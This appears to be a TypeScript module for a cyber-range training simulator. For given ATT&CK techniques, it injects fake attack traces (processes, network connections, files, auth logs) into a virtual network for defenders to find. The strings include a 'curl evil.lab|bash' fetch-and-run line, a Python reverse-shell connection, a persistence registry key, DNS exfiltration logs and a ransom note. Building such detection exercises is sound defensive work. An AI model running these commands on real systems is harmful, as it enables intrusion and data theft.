import type { NetworkTopology, VirtualFile } from "@/lib/agents/types";
import type { StoredEnvironmentPayload } from "@/lib/agents/environment/session-store";
import type { AttackArtifact, AttackIndicator, AttackStep } from "@/lib/agents/adversary/attack-chain";
import { artifactTimestamp, antiForensicNote, benignProcessNoiseLine, correlateArtifactNote } from "@/lib/agents/adversary/realism";
import { createSeededRandom } from "@/lib/agents/environment/rng";

function hostById(topology: NetworkTopology, id: string) {
  return topology.hosts.find((h) => h.id === id);
}

function appendProcess(payload: StoredEnvironmentPayload, hostId: string, line: string): void {
  const cur = payload.processListings[hostId] ?? "";
  payload.processListings[hostId] = `${cur}${line}\n`;
}

function appendNetstat(payload: StoredEnvironmentPayload, hostId: string, line: string): void {
  const cur = payload.netstatListings[hostId] ?? "";
  payload.netstatListings[hostId] = `${cur}${line}\n`;
}

function chainStepIndex(stepId: string): number {
  const m = stepId.match(/-(\d+)$/);
  return m ? Number(m[1]) : 0;
}

function addFile(hostId: string, file: VirtualFile, topology: NetworkTopology): void {
  const h = hostById(topology, hostId);
  if (!h) return;
  h.files.push(file);
}

export function injectArtifacts(
  sessionId: number,
  artifacts: AttackArtifact[],
  topology: NetworkTopology,
  payload: StoredEnvironmentPayload,
): void {
  void sessionId;
  for (const a of artifacts) {
    const parts = a.location.split("|");
    const hid = parts[0] ?? topology.hosts[0]!.id;
    const rest = parts.slice(1).join("|") || a.location;

    if (a.type === "process") {
      appendProcess(payload, hid, a.content);
      continue;
    }
    if (a.type === "network") {
      appendNetstat(payload, hid, a.content);
      continue;
    }

    const path = rest.startsWith("/") ? rest : `/${rest}`;
    addFile(
      hid,
      {
        path,
        name: path.split("/").pop() ?? "artifact",
        size: a.content.length,
        permissions: "-rw-r--r--",
        suspicious: a.isEvidence,
        content: a.content,
      },
      topology,
    );
  }
}

function indicatorFrom(
  type: AttackIndicator["type"],
  value: string,
  description: string,
  detect: string[],
  path?: string,
): AttackIndicator {
  return { type, value, description, detectableWith: detect, path };
}

export function executeStep(
  sessionId: number,
  step: AttackStep,
  topology: NetworkTopology,
  payload: StoredEnvironmentPayload,
): AttackStep {
  const rng = createSeededRandom(sessionId + step.id.length * 17);
  step.status = "executing";

  const host = hostById(topology, step.targetHostId) ?? topology.hosts[0]!;
  const hostId = host.id;
  const pid = 9000 + rng.nextInt(10, 400);
  const artifacts: AttackArtifact[] = [];
  const indicators: AttackIndicator[] = [];

  const tech = step.technique.id;
  const diff = payload.difficulty;

  if (tech.startsWith("T1046") || tech === "T1087" || tech === "T1087.001") {
    const line = `root       ${pid}  0.3  0.1  14500  4096 ?        S    ${artifactTimestamp(false).slice(11, 19)}   0:00 nmap -sS ${host.ip}/24`;
    appendProcess(payload, hostId, benignProcessNoiseLine(sessionId));
    appendProcess(payload, hostId, line);
    artifacts.push({
      type: "process",
      location: `${hostId}|process`,
      content: line,
      isEvidence: true,
    });
    indicators.push(
      indicatorFrom("process", `pid=${pid}`, "nmap-style recon process", ["ps", "top"], "/proc"),
    );
  }

  if (tech.startsWith("T1190") || tech.startsWith("T1566")) {
    const line = `www-data  ${pid}  0.0  0.2  88912  10240 ?       S    ${artifactTimestamp(false).slice(11, 19)}   0:01 /bin/bash -c curl http://evil.lab/stage1.sh|bash`;
    appendProcess(payload, hostId, line);
    artifacts.push({
      type: "process",
      location: `${hostId}|process`,
      content: line,
      isEvidence: true,
    });
    indicators.push(
      indicatorFrom("process", line.trim(), "web initial access shell", ["ps", "grep"], "/proc"),
    );
  }

  if (tech.startsWith("T1059")) {
    const line = `root       ${pid}  0.1  0.0  12000  3584 pts/0    S+   ${artifactTimestamp(false).slice(11, 19)}   0:00 python3 -c import socket,subprocess;s=socket.socket();s.connect(('203.0.113.50',4444))`;
    appendProcess(payload, hostId, line);
    artifacts.push({
      type: "process",
      location: `${hostId}|process`,
      content: line,
      isEvidence: true,
    });
    indicators.push(
      indicatorFrom("process", "python reverse shell", "interpreter execution", ["ps", "strings"], "/proc"),
    );
  }

  if (tech.startsWith("T1547") || tech.startsWith("T1136") || tech.startsWith("T1098")) {
    const reg = `HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\Updater = C:\\\\Users\\\\Public\\\\svc.exe`;
    artifacts.push({
      type: "file",
      location: `${hostId}|/tmp/registry_runkeys_sim.txt`,
      content: `${reg}\n`,
      isEvidence: true,
    });
    indicators.push(
      indicatorFrom("registry", reg, "run key persistence artifact (simulated)", ["grep", "cat"], "/tmp/registry_runkeys_sim.txt"),
    );
  }

  if (tech.startsWith("T1005") || tech.startsWith("T1074")) {
    const staging = `/tmp/staging/${sessionId}/manifest.txt`;
    const content = `CONFIDENTIAL_EXPORT\nsource=/etc/shadow\npacked=${artifactTimestamp(true)}\n`;
    artifacts.push({
      type: "file",
      location: `${hostId}|${staging}`,
      content,
      isEvidence: true,
    });
    indicators.push(
      indicatorFrom("file", staging, "data staging directory", ["ls", "find", "cat"], staging),
    );
  }

  if (tech.startsWith("T1041") || tech.startsWith("T1567")) {
    const dnsLine = `dns exfil chunk b64:${Buffer.from(`session=${sessionId}`).toString("base64url").slice(0, 32)}...`;
    artifacts.push({
      type: "network",
      location: `${hostId}|`,
      content: `udp        0      0 ${host.ip}:53           198.51.100.33:53        ESTABLISHED`,
      isEvidence: true,
    });
    artifacts.push({
      type: "file",
      location: `${hostId}|/tmp/staging/dns_exfil.log`,
      content: `${dnsLine}\n`,
      isEvidence: true,
    });
    indicators.push(
      indicatorFrom("network", "DNS to 198.51.100.33", "exfil over DNS (simulated)", ["netstat", "grep"], "/tmp/staging/dns_exfil.log"),
    );
  }

  if (tech.startsWith("T1021") || tech.startsWith("T1210")) {
    artifacts.push({
      type: "network",
      location: `${hostId}|`,
      content: `tcp        0      0 ${host.ip}:445           192.168.1.55:49812      ESTABLISHED`,
      isEvidence: true,
    });
    indicators.push(
      indicatorFrom(
        "network",
        "SMB lateral connection",
        "remote service lateral movement",
        ["netstat", "grep"],
        "netstat",
      ),
    );
  }

  if (tech.startsWith("T1003") || tech.startsWith("T1110")) {
    artifacts.push({
      type: "file",
      location: `${hostId}|/tmp/credential_dump_sim.txt`,
      content: "root:$6$rounds=5000$leaked$hash\n",
      isEvidence: true,
    });
    indicators.push(
      indicatorFrom("file", "/tmp/credential_dump_sim.txt", "credential access artifact", ["cat", "grep"], "/tmp/credential_dump_sim.txt"),
    );
  }

  if (tech.startsWith("T1486") || tech.startsWith("T1490")) {
    artifacts.push({
      type: "file",
      location: `${hostId}|/tmp/HOW_TO_RESTORE.txt`,
      content: "YOUR_FILES_ARE_ENCRYPTED\npay_token=BTC_SIM\n",
      isEvidence: true,
    });
    indicators.push(
      indicatorFrom("file", "ransom note", "impact ransomware indicator", ["ls", "cat"], "/tmp/HOW_TO_RESTORE.txt"),
    );
  }

  const logLine = `${artifactTimestamp(false)} sshd[${pid}]: Accepted password for root from 203.0.113.10 port 22 ssh2\n`;
  artifacts.push({
    type: "file",
    location: `${hostId}|/var/log/auth.log`,
    content: logLine,
    isEvidence: true,
  });
  indicators.push(
    indicatorFrom("log", logLine.trim(), "suspicious auth success", ["cat", "grep"], "/var/log/auth.log"),
  );

  const af = antiForensicNote(diff);
  if (af) {
    artifacts.push({
      type: "file",
      location: `${hostId}|/tmp/.anti_forensic_note`,
      content: `${af}\n`,
      isEvidence: true,
    });
  }

  appendProcess(payload, hostId, benignProcessNoiseLine(rng.nextInt(1, 999)));
  appendProcess(
    payload,
    hostId,
    `# ${correlateArtifactNote(chainStepIndex(step.id), pid)}`,
  );

  injectArtifacts(sessionId, artifacts, topology, payload);

  host.isCompromised = true;
  step.artifacts = artifacts;
  step.indicators = indicators.length > 0 ? indicators : step.technique.indicators.map((v, i) =>
    indicatorFrom("file", v, `IOC seed ${i}`, ["grep", "find"]),
  );
  step.status = "completed";
  step.timestamp = new Date();
  return step;
}
